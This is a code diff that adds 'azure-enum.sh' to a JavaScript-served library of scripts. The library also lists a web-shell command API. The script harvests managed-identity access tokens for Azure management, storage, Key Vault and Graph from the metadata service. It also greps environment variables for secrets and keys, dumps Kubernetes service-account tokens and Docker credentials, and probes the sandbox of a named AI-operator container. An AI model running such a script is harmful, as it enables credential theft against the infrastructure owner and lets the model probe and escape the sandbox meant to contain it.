@@ -288,7 +288,177 @@ def main():
         print(f"\\n❌ Error: {e}")
 
 if __name__ == "__main__":
-    main()`
+    main()`,
+
+  'azure-enum': `#!/bin/bash
+
+# Azure Container IAM and Metadata Enumeration Script
+# Usage: ./azure_enum.sh [output_file]
+
+OUTPUT_FILE="\${1:-azure_enum_$(date +%Y%m%d_%H%M%S).txt}"
+TIMESTAMP=$(date)
+
+# Colors for output
+RED='\\033[0;31m'
+GREEN='\\033[0;32m'
+YELLOW='\\033[1;33m'
+BLUE='\\033[0;34m'
+NC='\\033[0m' # No Color
+
+log() {
+    echo -e "$1" | tee -a "$OUTPUT_FILE"
+}
+
+log_section() {
+    echo "" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+    echo "$1" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+}
+
+run_cmd() {
+    local cmd="$1"
+    local description="$2"
+    
+    log "\${BLUE}[INFO]\${NC} $description"
+    log "\${YELLOW}Command:\${NC} $cmd"
+    log "---"
+    
+    eval "$cmd" 2>&1 | tee -a "$OUTPUT_FILE"
+    echo "" | tee -a "$OUTPUT_FILE"
+}
+
+log "\${GREEN}Azure Container IAM Enumeration\${NC}"
+log "Started: $TIMESTAMP"
+log "Container: chrome-operator-debian-alpha"
+log "Build: openaiappliedcaasprod.azurecr.io/chrome-operator-debian-alpha:20250722034337-5994535d7051-linux-amd64"
+
+# Azure Instance Metadata Service (IMDS) - Primary method
+log_section "AZURE INSTANCE METADATA SERVICE (IMDS)"
+
+# Check if IMDS is accessible
+log "\${BLUE}[INFO]\${NC} Testing IMDS connectivity..."
+if timeout 10 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >/dev/null 2>&1; then
+    log "\${GREEN}[SUCCESS]\${NC} IMDS is accessible"
+    
+    # Get instance metadata
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' "Instance Metadata"
+    
+    # Get compute metadata specifically
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"' "Compute Metadata"
+    
+    # Get network metadata
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"' "Network Metadata"
+    
+    # Try to get access token (if managed identity is enabled)
+    log_section "AZURE MANAGED IDENTITY"
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' "Management API Access Token"
+    
+    # Try different resource endpoints
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"' "Storage API Access Token"
+    
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"' "Key Vault Access Token"
+    
+    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"' "Microsoft Graph Access Token"
+    
+else
+    log "\${RED}[ERROR]\${NC} IMDS not accessible or filtered"
+fi
+
+# Check for Azure CLI
+log_section "AZURE CLI ENUMERATION"
+if command -v az >/dev/null 2>&1; then
+    log "\${GREEN}[SUCCESS]\${NC} Azure CLI found"
+    
+    run_cmd "az --version" "Azure CLI Version"
+    run_cmd "az account show" "Current Account"
+    run_cmd "az account list" "All Accounts"
+    run_cmd "az ad signed-in-user show" "Current User"
+    run_cmd "az role assignment list --assignee \\$(az ad signed-in-user show --query objectId -o tsv)" "Role Assignments"
+    run_cmd "az group list" "Resource Groups"
+    run_cmd "az vm list" "Virtual Machines"
+    run_cmd "az storage account list" "Storage Accounts"
+    run_cmd "az keyvault list" "Key Vaults"
+else
+    log "\${YELLOW}[INFO]\${NC} Azure CLI not found"
+fi
+
+# Check for environment variables with Azure credentials
+log_section "AZURE ENVIRONMENT VARIABLES"
+run_cmd 'env | grep -i azure' "Azure Environment Variables"
+run_cmd 'env | grep -i client' "Client Environment Variables"  
+run_cmd 'env | grep -i tenant' "Tenant Environment Variables"
+run_cmd 'env | grep -i subscription' "Subscription Environment Variables"
+run_cmd 'env | grep -i secret' "Secret Environment Variables"
+run_cmd 'env | grep -i key' "Key Environment Variables"
+
+# Check for Azure credential files
+log_section "AZURE CREDENTIAL FILES"
+run_cmd 'find / -name "*azure*" -type f 2>/dev/null | head -20' "Azure-related Files"
+run_cmd 'find /home -name ".azure" -type d 2>/dev/null' "Azure CLI Config Directories"
+run_cmd 'ls -la ~/.azure/ 2>/dev/null || echo "No .azure directory found"' "Azure CLI Config"
+run_cmd 'cat ~/.azure/config 2>/dev/null || echo "No Azure config file"' "Azure CLI Configuration"
+run_cmd 'ls -la /var/lib/waagent/ 2>/dev/null || echo "No waagent directory"' "Azure Linux Agent"
+
+# Check for service principal files
+run_cmd 'find / -name "*service*principal*" -o -name "*client*secret*" -o -name "*tenant*" 2>/dev/null | grep -v proc' "Service Principal Files"
+
+# Check for Kubernetes service account (if in AKS)
+log_section "KUBERNETES SERVICE ACCOUNT (AKS)"
+run_cmd 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "Not in Kubernetes"' "K8s Service Account"
+run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "No K8s token"' "K8s Token"
+run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "No K8s namespace"' "K8s Namespace"
+
+# Check for mounted Azure Storage
+log_section "AZURE STORAGE MOUNTS"
+run_cmd 'mount | grep -i azure' "Azure Storage Mounts"
+run_cmd 'df -h | grep -i azure' "Azure Storage Usage"
+
+# Try to access container registry info
+log_section "CONTAINER REGISTRY INFO"
+run_cmd 'echo "Container registry: openaiappliedcaasprod.azurecr.io"' "Registry Information"
+run_cmd 'nslookup openaiappliedcaasprod.azurecr.io 2>/dev/null || echo "DNS lookup failed"' "Registry DNS"
+
+# Check for Docker credentials
+run_cmd 'cat ~/.docker/config.json 2>/dev/null || echo "No Docker config"' "Docker Credentials"
+run_cmd 'ls -la /root/.docker/ 2>/dev/null || echo "No root Docker config"' "Root Docker Config"
+
+# Network reconnaissance for Azure services
+log_section "NETWORK RECONNAISSANCE"
+run_cmd 'curl -s --connect-timeout 5 https://management.azure.com/ | head -5 2>/dev/null || echo "Cannot reach Azure Management API"' "Azure Management API"
+run_cmd 'curl -s --connect-timeout 5 https://openaiappliedcaasprod.azurecr.io/v2/ | head -5 2>/dev/null || echo "Cannot reach Container Registry"' "Container Registry API"
+
+# Check for MSI endpoint variations
+log_section "MSI ENDPOINT VARIATIONS"
+run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity?api-version=2018-02-01" 2>/dev/null || echo "MSI identity endpoint not accessible"' "MSI Identity Endpoint"
+run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>/dev/null || echo "MSI info endpoint not accessible"' "MSI Info Endpoint"
+
+# Container-specific checks
+log_section "CONTAINER ANALYSIS"
+run_cmd 'cat /.dockerenv 2>/dev/null || echo "Not a Docker container or no .dockerenv"' "Docker Environment"
+run_cmd 'cat /proc/1/cgroup | grep -i azure' "Azure Container Groups"
+run_cmd 'hostname' "Container Hostname"
+run_cmd 'cat /etc/hostname' "Hostname File"
+
+# Check for any Azure-related processes
+log_section "AZURE PROCESSES"
+run_cmd 'ps aux | grep -i azure' "Azure Processes"
+run_cmd 'ps aux | grep -i waagent' "Azure Linux Agent Process"
+
+log ""
+log "\${GREEN}[COMPLETE]\${NC} Azure enumeration finished at $(date)"
+log "\${BLUE}[INFO]\${NC} Results saved to: $OUTPUT_FILE"
+
+# Create a summary
+SUMMARY_FILE="azure_summary_$(date +%Y%m%d_%H%M%S).txt"
+echo "Azure Enumeration Summary - $(date)" > "$SUMMARY_FILE"
+echo "Container: chrome-operator-debian-alpha" >> "$SUMMARY_FILE"
+echo "Registry: openaiappliedcaasprod.azurecr.io" >> "$SUMMARY_FILE"
+echo "" >> "$SUMMARY_FILE"
+echo "Key Findings:" >> "$SUMMARY_FILE"
+grep -i "error\\|success\\|token\\|access" "$OUTPUT_FILE" | head -10 >> "$SUMMARY_FILE"
+
+log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`
 };
 
 // Function to get HTML content (files page only)
@@ -402,6 +572,10 @@ async function getHTMLContent() {
                 <li class="file-item">
                     <a href="/files/web-shell" class="file-link" style="color: #9c27b0; font-weight: bold;">🐍 web-shell.py</a>
                     <div class="file-desc">Simple command API server - GET /api/command?cmd=YOUR_COMMAND for instant results</div>
+                </li>
+                <li class="file-item">
+                    <a href="/files/azure-enum" class="file-link" style="color: #0078d4; font-weight: bold;">☁️ azure-enum.sh</a>
+                    <div class="file-desc">Azure Container IAM and Metadata Enumeration - IMDS queries, managed identity checks, Azure CLI enumeration, credential discovery</div>
                 </li>
             </ul>
         </div>
